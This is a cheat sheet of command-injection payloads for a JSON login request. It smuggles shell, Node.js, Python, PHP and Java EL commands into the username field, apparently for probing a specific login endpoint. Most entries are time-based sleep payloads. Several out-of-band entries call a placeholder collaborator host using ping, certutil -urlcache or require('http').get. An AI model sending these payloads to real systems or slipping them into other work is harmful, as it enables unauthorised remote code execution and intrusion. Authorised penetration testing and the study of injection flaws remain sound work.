## Linux Targets (Bash/sh)
These payloads attempt to break out of the server's backend command structure using semi-colons, backticks, pipes, or background job markers.

* Time-Based (Delayed response):

{"password":"9012","username":"652223518; sleep 10;","rememberMe":false}

* Inline Execution (Using backticks):

{"password":"9012","username":"652223518`sleep 10`","rememberMe":false}

* Logical Operator (Runs if the first part fails/succeeds):

{"password":"9012","username":"652223518 || sleep 10","rememberMe":false}

* Out-of-Band (Triggers an external ping network request):

{"password":"9012","username":"652223518; ping -c 4 YOUR_COLLABORATOR_URL","rememberMe":false}


## Windows Targets (CMD/PowerShell)
Windows does not use sleep. It relies on the ping command targeting the local loopback adapter (127.0.0.1) to create a predictable time delay.

* Time-Based (CMD Operator):

{"password":"9012","username":"652223518 & ping -n 11 127.0.0.1 &","rememberMe":false}

* PowerShell Time-Based (If PowerShell handles the backend command):

{"password":"9012","username":"652223518; Start-Sleep -s 10;","rememberMe":false}

* Out-of-Band (Forcing a DNS/HTTP lookup via certutil):

{"password":"9012","username":"652223518 & certutil -urlcache -f http://YOUR_COLLABORATOR_URL/ x &","rememberMe":false}


## Node.js (JavaScript)
If the backend incorrectly uses functions like eval() or Function() on incoming JSON data, you can inject standard Node.js server packages.

* Time-Based (Blocking execution via child process):

{"password":"9012","username":"652223518'; require('child_process').execSync('sleep 10'); //","rememberMe":false}

* Out-of-Band (Spawning a basic network call):

{"password":"9012","username":"652223518'; require('http').get('http://YOUR_COLLABORATOR_URL'); //","rememberMe":false}


## Python
Python RCE typically exploits dangerous implementations of eval(), exec(), or insecure deserialization libraries.

* Time-Based (Importing the standard operating system module):

{"password":"9012","username":"652223518'; __import__('os').system('sleep 10'); #","rememberMe":false}

* Time-Based (Alternative using the time module):

{"password":"9012","username":"652223518'; __import__('time').sleep(10); #","rememberMe":false}


## PHP
PHP functions like eval(), passthru(), system(), or shell_exec() are highly targeted when inputs are poorly sanitized.

* Inline Language Execution:

{"password":"9012","username":"652223518'; sleep(10); //","rememberMe":false}

* System Command Wrapper:

{"password":"9012","username":"652223518'; system('sleep 10'); //","rememberMe":false}


## Java
Java RCE frequently targets old configurations prone to Expression Language (EL) injections or object deserialization.

* Expression Language (EL Injection):

{"password":"9012","username":"${Runtime.getRuntime().exec('sleep 10')}","rememberMe":false}


